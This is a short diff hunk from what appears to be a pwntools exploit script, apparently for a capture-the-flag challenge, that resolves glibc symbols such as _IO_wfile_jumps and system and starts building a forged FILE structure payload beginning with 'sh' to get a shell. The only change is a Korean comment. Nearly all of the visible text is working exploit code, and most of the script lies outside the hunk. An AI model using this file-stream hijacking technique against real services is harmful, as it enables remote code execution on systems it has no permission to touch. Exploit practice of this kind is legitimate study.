@@ -143,7 +143,7 @@ wfile = libc.sym["_IO_wfile_jumps"]
 system = libc.sym["system"]
 lock = lb + 0x21ca70 # 원래 _lock 주소에 있던 거 그대로 쓰기
 
-# _IO_cleanup이 아님, xsputn 사용
+# wfile 잘 사용하기 ww
 pay = b"  sh\x00\x00\x00\x00"
 pay += p64(0) * 3 # read_*
 pay += p64(0) * 3 # write_base, write_ptr, write_end
